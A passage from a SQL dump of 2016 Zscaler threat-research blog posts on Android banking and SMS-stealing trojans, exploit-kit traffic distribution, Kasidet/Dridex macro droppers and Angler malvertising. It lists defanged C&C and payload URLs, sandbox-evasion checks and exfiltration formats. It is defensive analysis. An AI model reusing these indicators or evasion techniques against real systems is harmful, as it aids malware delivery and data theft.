Additionally, disable the option of \"Unknown Sources\" under Settings of your device. This will not allow installation of apps from unknown sources.         Conclusion:        The application divides the overall functionality between the various dropped files. This can be a mechanism to evade detection by AVs. If one of the applications is detected by AV, the other applications can continue with their work. It is also interesting to note that each of these dropped applications try to target different sim operators in China.    There has been an increasing tendency of malware in disguise of adult rated applications in order to attract victims. The best way to avoid such applications is to stick to official app stores like Google Play and the Amazon app store.    ---      Research Blog by - Lakshmi Devi & Shivang Desai', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/adult-themed-android-sms-stealer-trojan');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (108, 'Android Marcher now marching via porn sites', 'Viral Gandhi', 'March 10, 2016', 'Introduction  Android Marcher Trojan was first seen in 2013 scamming users for credit card information by prompting fake Google Play store payment page. In subsequent years, Marcher variants also started targeting banking applications by presenting fake login pages to steal user credentials.    Marcher has continued to stay active and was recently covered by phishlabs. In this blog, we will cover a new wave of Marcher Trojan that is active since past one month where the malware arrives as an adobe flash installer package. We have captured over 50 unique payloads from this campaign. Majority of these Marcher payloads are from pornographic sites serving fake adobe flash player for watching porn. The primary goal of this malware is still the same - display a fake Google Play store payment page and steal financial information from the user.    Technical analysis  The infection cycle starts with the mobile user receiving a malicious URL via e-mail or SMS. Once the user opens this URL, the site will prompt the user to download and install the Adobe Flash Player update as seen below:      	  		  			  		  		  			Fake Adobe Flash Player outdated warning  		  	    The file that gets downloaded as a result of this action is aptly named - AdobeFlashPlayer.apk. Upon installation, malware asks for administrative access in order to perform its functions as seen below:      	  		  			  		  		  			Requests administrative access  		  	    Once installed, Marcher connects to a predetermined Command & Control (C&C) server and sends information about all the installed applications on the infected device as seen here:      	  		  			  		  		  			Relaying installed package information to C&C  		  	    During our analysis, we also observed a unique approach where the C&C server will send a response generating a MMS notification on the infected device saying \"You have received MMS\" and instructs the user to visit \"mms-service[.]info/mms\" to see the content of the MMS.      	  		  			  		  		  			MMS content  		  	    This site redirects the user to the X-VIDEO app on official Google Play store. According to several reviews of this app, the users are claiming it to be a fake app that simply crashes after installation. We were able to verify the same crash behavior when installed on the latest Android OS Marshmallow 6.0.1.  We haven\'t analyzed this app in any further detail but have been in touch with Google\'s Android team to review these findings. The app in question has been downloaded more than 100,000 times and some of these downloads may have happened from infected devices. (UPDATE: This app has been verified as clean by Google\'s Android team but they are monitoring it further.)      	  		  			  		  		  			Official Play store app- X-VIDEO  		  	    As part of the infection cycle, Marcher will then display a fake Google Play payment screen asking for payment information to complete the account setup.      	  		  			  		  		  			Fake Google Play payment screen.  		  	        	  		  			  		  		  			Credit card information.  		  	    If the user falls for this screen then the credit card information is logged and relayed to the C&C server as seen below:      	  		  			  		  		  			Payment information sent to C&C server.  		  	        	  		  			  		  		  			  			  				  					  						Information being sent to C&C server  					  				  			  			  		  	    Newer variants of the Android marcher will also present a fake online banking login page based on information collected about already installed banking apps on victims device. Here is a sample fake login page that the user will see if the infected device has Commonwealth Bank of Australia mobile app installed.      	  		  			  		  		  			Fake NetBank login screen  		  	    The user banking credential information is relayed back to the C&C server in plain text as seen below:      	  		  			  		  		  			Stolen information sent in plain text  		  	        Following are some of the financial institution mobile apps that are targeted by Marcher:        	BankSA - Bank of South Australia  	Commerzbank  	Commonwealth Bank of Australia - NetBank app  	Deutsche Postbank  	DKB - Deutsche Kreditbank  	DZ Bank  	Deutsche Bank  	Fiducia & GAD IT  	ING Direct  	La Banque Postale  	Mendons  	NAB - National Australia Bank  	PayPal  	Santander Bank  	Westpac  	WellStar billpay app                Conclusion    Android Marcher has been around since year 2013 and continues to actively target mobile user\'s financial information. To avoid being  a victim of such malware, it is always best to download apps only from trusted app stores, such as Google Play. This can be enforced by unchecking the \"Unknown Sources\" option under the \"Security\" settings of your device.    Zscaler ThreatLabZ is actively monitoring this malware and ensuring that Zscaler customers are protected.    IOCs      C&C URLs        	hxxp://78[.]46[.]123[.]205/111/get[.]php  	hxxp://78[.]46[.]123[.]205/111/set_card[.]php  	hxxp[:]//petrporosya[.]com/123/1/01[.]php?id=[UNIQID]        Sample URLs serving the Android Marcher payloads        	hxxp://lovehomevideo[.]cf/adobeflashplayer[.]apk    	hxxp://videolike[.]ga/adobeflashplayer[.]apk    	hxxp://lovehomevideo[.]ml/adobeflashplayer[.]apk    	hxxp://analsextube[.]ml/adobeflashplayer[.]apk    	hxxp://myporno[.]cf/adobeflashplayer[.]apk   	hxxp://mymovie-porn[.]ga/adobeflashplayer[.]apk    	hxxp://lovehomevideo[.]ga/adobeflashplayer[.]apk    	hxxp://adobe-flash-player[.]su/flashplayer[.]apk', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/android-marcher-now-marching-porn-sites');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (109, 'A Case Of Keitaro (featuring RIG And Nuclear)', 'Ed Miles', 'February 29, 2016', 'Introduction    Zscaler ThreatLabZ closely monitors exploit kit activity and we have seen some interesting trends in RIG Exploit Kit behavior recently, including a significant spike in cases observed in the wild. We specifically saw large upticks in the closing weeks of January.      	  		  			  		  		  			Fig 1 - RIG Blocks over 2 Months  		  	      While trying to replicate some of the cases in our testing VMs, we found an infected site suddenly began serving Nuclear EK, and we noticed it doing so via a Keitaro Traffic Distribution System campaign. We have been monitoring these actors since, and in this blog we will briefly describe the activity seen among these campaigns of Keitaro, RIG, and Nuclear.    Keitaro TDS    Traffic Distribution Systems are software and service packages that do pretty much what the name says: their primary function is to intelligently route web traffic that arrives at the TDS operator controlled server. This is not to say they don\'t have any other functionality, major TDS packages like Keitaro actually provide a great deal of flexibility and control, and malware and exploit kit operators take significant advantage of these features.    In an industry that generally prefers to keep operational and functional details under wraps, Keitaro is an interesting beast that doesn\'t shy away from the public eye. Keitaro not only has a readily accessible public website with what appears to be a reasonable cost and easy purchase process, there is also a full online help section and an online demo!      	  		  			  		  		  			Fig. 2 - Keitaro TDS Dashboard  		  	      Overview    Keitaro has many features and options, and we don\'t want to recreate the online help files, so we will only cover some of the basics with few other interesting highlights. This TDS operates on highly-customizable campaigns which come in three flavors: standard redirects, banner serving, and simple impression tracking. These campaigns can have multiple \"streams\" chosen by linear or randomized selection, and can identify users by IP and/or cookie and enforce unique hits on them across variable timeframes.      	  		  			  		  		  			Fig 3 - Keitaro TDS Campaign Creation  		  	      Besides identifying users by IP and cookies, Keitaro can make decisions based upon a wide variety of features including:  - browser version  - geographic location  - OS/platform  - Mobile carrier    While we can\'t say which specific rules have been set up by the operators of this instance of Keitaro, we have seen some behaviors mentioned above (especially blocks on repeat attempts from the same source IPs) in addition to the gate serving both RIG and Nuclear at different times.    Observations    So far, we have described a system that seems perfectly above-board, however Keitaro has some features that appear to be designed specifically for bad-actors such as EK operators. One major feature recently highlighted by Kafeine is the addition of AV checks. This feature allows the TDS operator to make sure none of the payloads being served are detected by AV vendors. Conveniently, they integrate with services that don\'t share samples with the AV industry. Additionally, there is a section in the help files that specifically details how to break referer chains. This is a feature that directly impacts the ability of researchers to trace activity chains and connect exploit kit instances back to the originating site.      	  		  			  		  		  			Fig 4 - Keitaro TDS Help Information  		  	      While Keitaro appears to be very powerful and highly polished product, we spotted some interesting misconfiguration side effects from this campaign. Early on in our monitoring, the TDS would attempt to direct repeat visitors to \"www.yahoo.com\" using a 302 redirection. It turned out that, lacking the scheme portion of the URL, the redirect ended up sending users to the login page of the Keitaro admin panel. This is illustrated in the screenshot below, where an infected page has two injections for the Keitaro gate. The first injection yields a RIG cycle and the second improperly attempts to redirect to Yahoo.      	  		  			  		  		  			Fig 5 - Keitaro TDS Redirecting to Admin Panel  		  	      Another misconfiguration case we saw may have been an issue more related to the EK infrastructure than on the TDS itself, but one visit to an infected site yielded a redirect to an invalid RIG URL: hxxp://out%2520of%2520datedate/?apitoken=l3SKfPrFJx_ESYjCJunFSrdObkXRFh-BxoubkOM    Despite the occasional misconfigurations seen in this Keitaro instance, it has proven to be a significant source of traffic for both RIG and Nuclear.      	  		  			  		  		  			Fig 6 - Keitaro Traffic over 30 days  		  	      RIG    The RIG Exploit Kit has been very active in recent weeks, and we have identified multiple campaigns with some varying tactics. We\'ve seen a few cases of malvertising and multiple styles of gates including the occasionally misconfigured Keitaro already discussed..    Gates    In recent behavior, we have seen two primary types of gates being used besides Keitaro. The first was the common gate that has been seen in RIG campaigns for some time. The second was a series of gates that followed a pattern of using the same second level domain across four top level domains, rotating the second level names roughly every 24 hours.  Common RIG Gate  We don\'t have a clever name for this gate, but it\'s a familiar pattern, with a number of features at malware-traffic-analysis.net. It uses a host naming scheme similar to the infrastructure that actually delivers RIG landing pages and payloads: a two letter third level domain on top of what appear to be domain-shadowed accounts at Godaddy. The URL path in each case is a randomized .php filename with no parameters.    Quad Power Gate  Due to their use of the same second-level name across four TLD\'s, we are calling this the Quad Power Gate. This gate utilizes the TLDs .win, .top, .party, and .bid. Though the operators of this gate cycled the hostnames frequently, the path used for the gate\'s URLs has only changed twice. The first hits seen on the Zscaler network were to domain.tld/persil.php, but we later saw domain.tld/deliner.php. Beginning on the 23rd of February, we the gate began using the filenames \"magnum.php\" and \"puerto.php\".      	  		  			  		  		  			Fig 7 - Quad Power Gate Repeatedly Serving RIG  		  	      While a casual glance at the content returned by the gate might lead one to believe it\'s simply serving a jQuery script, the truth is that a RIG iframe is actually hidden between large blocks of Javascript. This gate also turns out to be a repeat offender, not only because we found its presence in a number of infected sites, but the gate has a tendency to repeatedly refresh itself, generating one RIG impression after the other. Although we could not confirm any specific instances, we believe this gate to have been used in malvertising attacks as well.    Landing Pages    RIG landing pages, much like the URL pattern used, has not changed too much. The landing page basically consists of one large blob, with multiple script objects, and several layers of encoding and obfuscation.      	  		  			  		  		  			Fig 8 - Exceprt from RIG Landing Page  		  	      Payloads    Execution is achieved on victim machines via two primary paths: first the usual IE/VBScript God Mode exploit (CVE-2014-6332), and second a large and highly obfuscated Flash payload. Despite the complexity of the protections employed, they are not using the Diffie Hellman-based protection for triggers and shellcode stages. The Flash payload appears to focus on CVE-2015-5122    As for malware, we have recently seen Tofsee being delivered by RIG.      	  		  			  		  		  			Fig 9 - Strings Decoded from Binary Data in RIG Payload  		  	      Nuclear    Like RIG, the Nuclear Exploit Kit is a prolific threat to web surfers. However, it maintains its position in the EK hierarchy, being more sophisticated than RIG yet not quite as cutting-edge as Angler. As an illustration of this point, we have not yet seen Nuclear adopt the latest Silverlight exploit that Angler recently debuted.      	  		  			  		  		  			Fig 10 - Nuclear Blocks over 2 Months  		  	      Gates    Besides the Keitaro gates, we have seen one prolific gate pattern over all else. The operators of this campaign seem to use infected sites which then redirect to the Nuclear landing page. We have seen some very interesting cases of this gate, including one site apparently owned by a bicycle shop in the UK. In this instance, the gate injection was served via the shop\'s Ebay page, in requests for embedded images.      	  		  			  		  		  			Fig 11 - Nuclear Gate Inject in Image from Ebay Listing  		  	      Landing Pages    Nuclear\'s landing page continues to utilize data stored in various HTML elements, which is then parsed by scripts to identify browser and plugin features and determine the execution flow.      	  		  			  		  		  			Fig 12 - Nuclear Landing Page Excerpt  		  	      Payloads    Nuclear continues the trend of delivering single file Flash payloads, with multiple secondary payloads: one each for Flash versions <18.0.0.203, <19.0.0.207, and higher. We saw an interesting change between the method used to transition to the secondary payloads.    The initial first-stage SWF used a complicated execution flow with the three payloads being constructed across multiple functions. In each case, two separate arrays of bytes are combined before a version-specific XOR key is used for the \"final\" payload. We use quotes around \"final\" because Nuclear continues to utilize a Diffie Hellman protocol to protect the actual exploit trigger and shellcode stage.      	  		  			  		  		  			Fig 13 - Nuclear Stage 1 Payload Obfuscation  		  	      The latter first-stage Flash payload dispensed with all of the complicated reconstruction, and simply uses base64-encoded strings to encode the second-stage SWFs. The second-stage payloads, however, were almost identical to those found in the previous iteration as shown below.      	  		  			  		  		  			Fig 14 - Nuclear Stage 2 Payload Comparison  		  	        The second stage exploits appeared to be CVE-2015-5122 for Flash <18.0.0.203, CVE-2015-7645 for <19.0.0.207, and the \"default\" case of CVE-2015-8651 for anything newer. Besides the Flash exploits, we also saw CVE-2013-2551 for direct exploitation of IE.    Following succesful exploitation, we have seen Dofoil being installed. The screenshot below shows its signature pattern of decoy GET and POST requests to URLs in the browser history with a few actual callbacks mixed in. The command & control server even uses 404 error codes to attempt to mask the nature of the callback activity.      	  		  			  		  		  			Fig 15 - Nuclear Cycle Including Dofoil Callback and Decoy Traffic  		  	      Conclusion    Though Nuclear and RIG both generate a good deal of impressions via other routes, the Keitaro gate has been a significant source of traffic on its own. It\'s clear that the flexibility in Keitaro\'s configuration options make it a powerful partner for the criminal operators of these and other exploit kits. As always, Zscaler ThreatLabZ will continue to monitor Nuclear, RIG, and Keitaro for further developments.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/case-keitaro-featuring-rig-and-nuclear');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (110, 'Fake Security App For AliPay Customers - Android SMS Stealer', 'Shivang Desai', 'February 10, 2016', 'During an ongoing analysis to protect our customers from the latest mobile threats, we came across an Android malware that disguised itself as a security feature for a famous Chinese online payment app, AliPay. Upon analysis, we discovered that the fake app is a malicious SMS stealer Trojan.\r\n\r\nThe malware developers were interested in targeting AliPay due to its widespread customer base.\r\n\r\nAlipay is a third-party online payment platform with no transaction fees, with more than 65 financial institutions including Visa as well as Mastercard. Globally, more than 300 merchants use Alipay. It currently supports transactions in 14 major foreign currencies. AliPay is also considered the PayPal of the East.\r\n\r\nFake AliPay Security Controls App\r\nAppname (app label) : 安全控件\r\nMd5 : fad55b4432ed9eeb5d7426c55681586c\r\nPackage Name : com.bing.receive\r\nVirus Total Detection : 2/55 (at the time of analysis)\r\n\r\nThe app portrays itself as \"Security Controls\" tricking victim to think it’s an app enhancing AliPay security. Upon installation, the app hides itself and the icon disappears, which is a usual technique for a malware to stay hidden. Once installed, the malware registers Android services, which steals SMS and forwards them to the Command and Control (C&C) server.\r\n\r\nTechnical details \r\n\r\nUpon installation, the app shows itself as a part of AliPay group.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			App Icon\r\n		\r\n	\r\n\r\n\r\nAs soon as the victim tries to use the app, it displays an introductory screen and it was programmed to disappear after 3 seconds. Both the screen and the icon are gone at this instance.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Introductory Screen\r\n		\r\n	\r\n\r\n\r\nThe victim might think that the app must be faulty and was removed implicitly by Android OS.  Lesser does s/he knows that malware is activated in the background and achieves its tasks through services.\r\n\r\nAndroid services are components that can run in background and perform long running tasks without user\'s knowledge. Following are the services used and defined by the malware:\r\n\r\n\r\n	MyService\r\n	DealService\r\n	TestService\r\n\r\n\r\nThe malware also registers few broadcast receivers alongside. Broadcast receivers are Android components which acts upon activation of particular events they are registered for.\r\nFollowing are the receivers registered by malware:\r\n\r\n\r\n	System Boot Receiver \r\n	Massage Receiver (Note the typo - Massage instead of Message)\r\n	Screen-On Receiver\r\n\r\nThe function MainActivity of malware hides the icon and starts the service named, MyService.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Main Activity\r\n		\r\n	\r\n\r\nAs soon as MyService is started, it initiates other tasks and registers SystemBootReceiver and MassageReceiver.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			MyService Service\r\n		\r\n	\r\n\r\n\r\nMassageReceiver is a broadcast receiver and is triggered whenever an SMS is received. Its main task is to look for any incoming SMS message and fetch its details. Once the details are fetched, it calls DealService and passes the SMS data along with the call.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			MassageReceiver Broadcast Receiver\r\n		\r\n	\r\n\r\n\r\nDealService\'s task is to get the SMS messages from receiver and send it across to the C&C server. It starts an Asynchronous task (AsyncTask, as shown in screenshot below) which then forwards the messages to C&C server in the form of POST request.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fetching SMS and POST request\r\n		\r\n	\r\n\r\n\r\nSMS details are sent to the C&C server using POST request, as seen in screenshot below. Unfortunately the C&C server was already taken down during the analysis and so further details related to campaign could not be fetched.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			SMS data sent to CnC\r\n		\r\n	\r\n\r\n\r\nAlong with MassageReceiver, another receiver named SystemBootReceiver plays an important role for malware\'s persistent nature by making sure that the motive of malware is achieved all the time.\r\n\r\nSystemBootReceiver is a broadcast receiver that triggers itself at every system reboot.\r\nIts main task is to make sure MyService is up and running. At every reboot, it starts MyService as seen below:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			System Boot Receiver\r\n		\r\n	\r\n\r\n\r\nThe main motive of malware developer was to collect SMS messages from victim\'s phone. The malware author\'s end goal is unknown at present but we will be actively looking for traces of this campaign.\r\n\r\nWork Flow of Malware: \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Work Flow\r\n		\r\n	\r\n\r\n\r\nMitigations\r\nWe always suggest that our customers and everyone, do not trust apps from unknown parties and only download items from the official app stores that are trustworthy, like Google\'s Playstore.\r\n\r\nThe only official apps provided by AliPay are as shown in the screenshot below. There is no mention of any app named AliPay-Security Controls.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Playstore - Official AliPay Apps\r\n		\r\n	\r\n\r\n\r\nRemoval\r\nSince the malware does not ask for Administrator privileges, removing it is not a difficult task.\r\n\r\nThe victim can traverse to Settings option in the Android device.\r\n\r\n\r\n	Settings --> Apps\r\n	Find the app in the list and click on it\r\n	Then, click on Uninstall option\r\n	Click Ok\r\n\r\n\r\nWe urge users to not trust any unknown links received via messages or emails. Additionally, disable the option of \"Unknown Sources\" under Settings of your device. This will not allow installation of apps from unknown sources.', 'Mobile;Mobile Malware', 'https://www.zscaler.com/blogs/research/fake-security-app-alipay-customers-android-sms-stealer');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (111, 'Malicious Office Files Dropping Kasidet And Dridex', 'Nirmal Singh', 'January 29, 2016', 'Introduction     We have covered Dridex Banking Trojan being delivered via various campaigns involving Office documents with malicious VBA macros in the past. However, over the past two weeks we are seeing these malicious VBA macros leveraged to drop Kasidet backdoor in addition to Dridex on the infected systems. These malicious Office documents are being spread as an attachment using spear phishing emails as described here. The malicious macro inside the Office document is obfuscated as shown in the code snapshot below -          	  		  			  		  		  			Macro code  		  	      The macro downloads malware payload from the hardcoded URL. We have seen following URLs used in different document payloads that we captured for this campaign:      	      armandosofsalem[.]com/l9k7hg4/b4387kfd[.]exe  	      trinity.ad-ventures[.]es/l9k7hg4/b4387kfd[.]exe  	      188.226.152[.]172/l9k7hg4/b4387kfd[.]exe      In this blog, we will provide a detailed analysis for the Kasidet variant that we spotted in this campaign.    Kasidet Analysis    Installation:   Kasidet installs itself into %APPDATA% folder. It creates a new folder there with the name \"Y1FeZFVYXllb\", this string is hardcoded in the malware. The same string is used as mutex name and in creating a Registry key for ensuring persistence upon system reboot.    AntiVM Check:  Kasidet tries to detect analysis systems during execution through following checks.  Checking Dubugger through \"IsDebuggerPresent\" and \"CheckRemoteDebuggerPresent\" Windows APIs. It also checks for the following popular sandbox related strings:      User Name: \"MALTEST\",  \"TEQUILABOOMBOOM\", \"SANDBOX\", \"VIRUS\", \"MALWARE\"    File Name: \"SAMPLE\", \"VIRUS\", \"SANDBOX\"        It tries to detect wine software by checking if kernel32.dll is exporting \"wine_get_unix_file_name\" function or not. It detects Vmware, VirtualBox, QEMU and Bochs by checking for following registry entries:            	  		  			   			Vmware  			  			  			\"SOFTWARE\\\\VMware, Inc.\\\\VMware Tools\"  			  		  		  			  			\"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port\\Scsi Bus\\Target Id\\Logical Unit Id\", \"Identifier\" , Vmware\"  			  		  		  			  			\"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port\\Scsi Bus\\Target Id\\Logical Unit Id\", \"Identifier\" , \"VBOX\"  			  		  		  			   			VirtualBox  			  			  			\"HARDWARE\\\\Description\\\\System\", \"SystemBiosVersion\" , \"VBOX\"    			SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions\"    			\"HARDWARE\\\\Description\\\\System\", \"VideoBiosVersion\" , \"VIRTUALBOX\"  			  		  		  			  			QEMU  			  			  			\"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port \\Scsi Bus \\Target Id \\Logical Unit Id \", \"Identifier\" , \"QEMU\"    			\"HARDWARE\\\\Description\\\\System\" , \"SystemBiosVersion\" , \"QEMU\"  			  		  		  			  			Bochs  			  			  			\"HARDWARE\\\\Description\\\\System\" , \"SystemBiosVersion\" , \"BOCHS”  			  		  	        Information Stealing capabilities:      Kasidet uses following two methods for stealing information from the victim\'s machine:    1. Memory Scraping – This allows Kasidet to steal credit card data from the memory of Point-Of-Sale (POS) systems. It scans the memory of all the running processes except the operating system processes listed below:  System  smss.exe  csrss.exe  winlogon.exe  lsass.exe  spoolsv.exe  devenv.exe    The stolen information is relayed back to the attacker using following URI format –     d=1&id=<MachineID>&name=<SystemName>&type=<Track1 or Track2 data>&data=<stolen data>&p=< Process elevation status >    2. Browser Hooking –  This allows Kasidet to steal data from Web browsers. It can inject code into FireFox, Chrome, and Internet Explorer (IE). Browser names are not saved in plain text and instead this variant uses the same hash function as used by Carberp malware to encrypt the browser names. The following APIs are hooked in the web browser for stealing sensitive data:         	  		  			  			Browser  			  			  			API  			  		  		  			  			FireFox  			  			  			PR_Write  			  		  		  			  			Chrome  			  			  			WSASend  			  		  		  			  			IE  			  			  			HttpSendRequestW , InternetWriteFile  			  		  	        The stolen information is relayed back to the attacker using following URI format –     ff=1&id=<MachineID>&name=<SystemName>&host=<Base64 encoded host name>&form=< Base64 encoded HTTP header data>&browser=<Browser name>  The information stealing feature of this Kasidet variant were deactivated if the system locale or GeoUserID corresponds to Russia.    Network communication:    Kasidet contains a hardcoded list of Command & Control (C&C) server locations. It uses CryptStringToBinary API call to decrypt the embedded C&C URLs as seen below:        	  		  			  		  		  			Kasidet C&C list  		  	      Upon successful infection, Kasidet sends a HTTP POST request with data “enter=1” (without quotes). All HTTP header fields (User-Agent, Content-type and Cookie) are hard coded in the payload itself.          	  		  			  		  		  			Kasidet Hardcoded HTTP fields  		  	      C&C Server will not return required data if HTTP header fields are different.  The server sends a fake 404 response code and html data stating that page is not found but the C&C commands will be hidden in the response HTML comment tag as seen below:      	  		  			  		  		  			  			  				  					  						Kasidet - First communication with C&C  					  				  			  			  		  	          Kasidet will request for additional commands from the C&C server with the following POST request:          	  		  			  		  		  			Kasidet request for additional commands  		  	               	  		  			  			Variable  			  			  			Descriptions  			  		  		  			  			cmd  			  			  			Command. It is hardcoded in the malware payload as \'1\'.  			  		  		  			  			id  			  			  			MachineGuid value fetched  from Software\\Microsoft\\Cryptography registry key  			  		  		  			  			name  			  			  			System Name  			  		  		  			  			os  			  			  			Operating system version  			  		  		  			  			p  			  			  			Process elevation status  			  		  		  			  			av  			  			  			Antivirus installed on the infected system  			  		  		  			  			v  			  			  			Version of the bot. It is hardcoded in the malware. Current version that we analysed is 4.4  			  		  		  			  			w  			  			  			Flag that indicates whether the system locale and UserGeoID is Russia  			  		  	        Like browser names, all the command strings are also encrypted using a hash function. Below are some of the important commands:      	  		  			  			Command Hash  			  			  			Description  			  		  		  			  			0x0E587A65 (rate <number>)  			  			  			It is used in sleep function  			  		  		  			  			0x89127D3  			  			  			DDOS using HTTP protocol  			  		  		  			  			0x0B37A84B6  			  			  			Start keylogging and screen capture threads  			  		  		  			  			0x89068E8h  			  			  			Download and execute additional component. This file can be DLL, EXE or VBS.  			  		  		  			  			0x4A9981B7  			  			  			Search for given process name in current running processes in the system  			  		  		  			  			0x8D26744  			  			  			Find given file in system and upload to the server  			  		  		  			  			0CAB1E64A  			  			  			Drop setting.bin file,  change firewall settings to download and execute plugin component  			  		  		  			  			0x10E6C4  			  			  			Execute given command using windows cmd.exe  			  		  	               Conclusion         Malicious Office document file is a popular vector for malware authors to deliver their payloads. Dridex authors have leveraged this technique for over a year and it was interesting to see the same campaign and URLs being leveraged to deliver Kasidet payloads. While this does not establish any links between the two malware family authors, it reaffirms the fact that a lot of the underlying infrastructure and delivery mechanisms are often shared by these cyber criminals.    ThreatLabZ is actively monitoring this threat and ensuring signature coverage for Zscaler customers.    Analysis by - Abhay Yadav, Avinash Kumar and Nirmal Singh', 'Malware', 'https://www.zscaler.com/blogs/research/malicious-office-files-dropping-kasidet-and-dridex');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (112, 'Music-themed Malvertising Lead To Angler', 'ThreatLabz', 'January 19, 2016', 'Overview\r\nMalvertising, or \"malicious advertising,\" is not a new threat, and just a few weeks into 2016 ThreatLabZ has observed a malvertising campaign injecting iframes into banner advertisements that lead to Angler Exploit Kit. Surprisingly, the Angler operators took some vacation for the New Year, as noted by F-Secure, and have only recently resumed operations, so we were surprised to see a malvertising campaign so soon after their break.\r\n\r\nThis post will detail aspects of this campaign, and there is a reference list of indicators at the end of this post.\r\nOpenX/OpenAds and Malvertising\r\nOpenAds, now called OpenX or Revive Adserver, is an advertisement platform with a long history and is still quite popular. From a high level, when a user browses to a website using OpenAds for serving advertisements, small code stubs make requests to the OpenAds server, which decides which banner advertisement to run and sends the banner ad plus some tracking code back to the page. The banner advertisements usually rotate on some interval, and a single ad server can serve and control advertisements for multiple domains.\r\n\r\nUnfortuantely, the nature of banner advertisements makes them highly lucrative for criminal groups since injecting malicious content into an advertisement can impact hundreds or thousands of sites. This particular campaign impacted multiple OpenAds/OpenX servers which affected hundreds of domains. Intermediary sites were used as an additional hop prior to serving the Angler landing page, and only six second-level intermediary domains were observed, each using dozens of different subdomains and URIs. All six second-level intermediary domains share music-themed names:\r\n\r\n	everyoneismusical.com\r\n	musik4fingersonthemove.com\r\n	musik4littlefingers.com\r\n	youaremusical.com\r\n	youaremusicalforms.com\r\n	youaremusik.com\r\n\r\n\r\nInterestingly, these intermediary domains only use two different IPs for all the subdomains, and the operators appear to have changed hosts suddenly. Figure 1 shows the number of hits we captured for these two IPs.\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 1: Hits on Intermediary Domain IPs\r\n		\r\n	\r\n\r\n \r\n\r\niframe Trampolining\r\nThe infection cycle starts with a malicious iframe injected in the banner advertisement code that references an intermediary URL. The injected iframe loads transparently, and the intermediary domain server will respond in one of the following three ways:\r\n\r\n\r\n	Response code 200 - iframe to Angler Exploit Kit landing page\r\n	Response code 204 - no content\r\n	Response code 404 - fake \'not found\' page\r\n\r\nIf the intermediary domain serves an iframe, the Angler landing page is loaded transparently. A more complete overview of the infection cycle is shown below in Figure 2.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 2: Overview of Infection Cycle\r\n		\r\n	\r\n\r\n\r\n \r\nWe\'re calling the intermediary domain an \"iframe trampoline\" since the server may not respond with another iframe and can simply bounce the user out of the infection cycle with benign content.\r\n \r\nInfection Cycle\r\nLooking at a full infection cycle in Figure 3, the benign domain \'giftsnideas.com\' loads a banner ad with OpenX which contains an injected iframe to the trampoline domain. The trampoline domain\'s iframe finally sends the user to the Angler landing page. In this instance, the exploit failed, so no further content was loaded.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 3: Relevant URLs for Exploit Cycle\r\n		\r\n	\r\n\r\nBanner advertisement code on OpenAds/OpenX is very similar between servers. Figure 4 shows the injected iframe, which is simply inserted into the legitimate banner advertisement code.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 4: Advertisement with Injected iframe\r\n		\r\n	\r\n\r\nAll trampoline domains used a very similar URL format of two alphabetic directories followed by an alphabetic JavaScript file (.js). The only content loaded in every successful instance is an iframe to the Angler landing page, as shown in Figure 5.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 5: Trampoline Header and Response\r\n		\r\n	\r\n\r\nThe Angler landing page is exactly what you\'d expect and although there have been some recent changes, we won\'t rehash Angler in this post.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 6: Angler Landing Page\r\n		\r\n	\r\n\r\n \r\n\r\nConclusion\r\nMalvertising continues to be a highly effective means of targeting and compromising a large number of victims, and we expect this trend to continue for 2016. We noted that many of the victim sites we observed in this campaign were radio stations and auto enthusiast forums. Domains in these two groups are owned by Saga Communications and Autoforums.com, so it\'s likely that each uses a small number of ad servers to power the entire network of sites. ThreatLabZ will continue to monitor this campaign.\r\n \r\nIndicators\r\n \r\n\r\n\r\n	\r\n		\r\n			# Hits\r\n			Second Level Domain\r\n			Registrar\r\n			Registrant\r\n		\r\n		\r\n			23883\r\n			youaremusik.com\r\n			GODADDY\r\n			Mark Lippman\r\n		\r\n		\r\n			20681\r\n			musik4fingersonthemove.com\r\n			GODADDY\r\n			Mark Lippman\r\n		\r\n		\r\n			16878\r\n			everyoneismusical.com\r\n			GODADDY\r\n			Michael Lippman\r\n		\r\n		\r\n			16849\r\n			musik4littlefingers.com\r\n			GODADDY\r\n			Mark Lippman\r\n		\r\n		\r\n			5698\r\n			youaremusical.com\r\n			GODADDY\r\n			Michael Lippman\r\n		\r\n		\r\n			1619\r\n			youaremusicalforms.com\r\n			GODADDY\r\n			Michael Lippman\r\n		\r\n	\r\n\r\n \r\n\r\nURL IPs\r\n188.227.72.137 - IT-Grad nets - AS48096\r\n188.227.74.150 - IT-Grad nets - AS48096\r\n\r\nList of FQDNs and URLs\r\n\r\nCounts and FQDNs - via Pastebin (http://pastebin.com/7vSYi2uz)\r\n\r\nURLs - via Pastebin 